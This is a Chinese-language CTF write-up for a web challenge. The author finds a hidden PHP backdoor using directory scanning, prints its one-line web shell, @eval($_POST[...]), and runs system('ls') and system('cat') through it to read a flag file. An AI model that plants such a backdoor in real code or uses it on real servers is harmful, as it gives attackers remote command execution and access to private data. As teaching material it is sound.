进入后没有可以访问数据的接口,那先看f12
```http
HTTP/1.1 200 OK
Date: Thu, 22 Oct 2026 17:49:00 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 1000
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Welcome to my website<br><br>You want to get my secret,right???<br><br>But Now you cannot use the eval function in it<br><br>Try to find another place to get use of eval function!!!<br><br><html>
<head>
        <title>实验性website</title>
        <meta charset="UTF-8">
        <meta name="author" content="R1esbyfe">
        <meta name="keywords" content="Challenge06">
        <link rel="stylesheet" href="static/style.css">
    </head>
    <body>
    <!--It seems that you are going to exploit the eval function, but now I have disabled it-->
    <!--@eval($_POST['this_is_my_shell']);-->
    <!--hint: 当你不知道站点有哪些文件可以利用，也许你需要找一些能够获取路径文件的工具-->
    <!--当初这个站点被黑客们入侵了，好不容易修复完成，不知道黑客会不会在这里留下什么东西-->
    <!--说实话我有点害怕，因为我根本不知道它们在哪，万一给找到了又利用起来了怎么办-->    
    </body>
</html>
```
hint有提示:
 <!--hint: 当你不知道站点有哪些文件可以利用，也许你需要找一些能够获取路径文件的工具-->
 在kali用diresearch扫描:
 ```shell
 diresearch -u '靶机地址'
 ```
 diresearch是一个web路径扫描工具,用字典的方式来爆破服务器上隐藏的文件和目录

成功得到路径返回200ok:   **/php-backdoor.php**
访问路径
得到一串php代码
```php
<?php  
//try to exploit this backdoor function
    highlight_file(__FILE__);  //将这个源代码高亮显示出来
    @eval($_POST['ha_ha_you_find_me']);
```
主要看:@eval($_POST['ha_ha_you_find_me']);
\$post表示将后面的内容作为字符串的名称,通过post的方法传入
eval表示将传入的语句作为命令执行
@会抑制报错,使藏在这里的漏洞更难发现

也就是给服务器埋了一个远程后门

那我们可以在burp上开始尝试执行命令了
注意__$post变量只接受 Content-Type为`application/x-www-form-urlencoded`   html提交表单的默认形式
或`multipart/form-data`,包含文件上传的表单形式
需要在报文头里面加入content-type

尝试用php的system函数执行linux命令
```php
system('ls -la /')  //查看根目录
```
得到一个显眼文件
-rw-r--r--   1 root root   57 Aug 18  2025 this_is_flag_68b329da9893e34.txt

然后cat读取文件内容即可(记得文件名前面加/表示路径)
```php
system('cat /this_is_flag_68b329da9893e34.txt')
```
ok

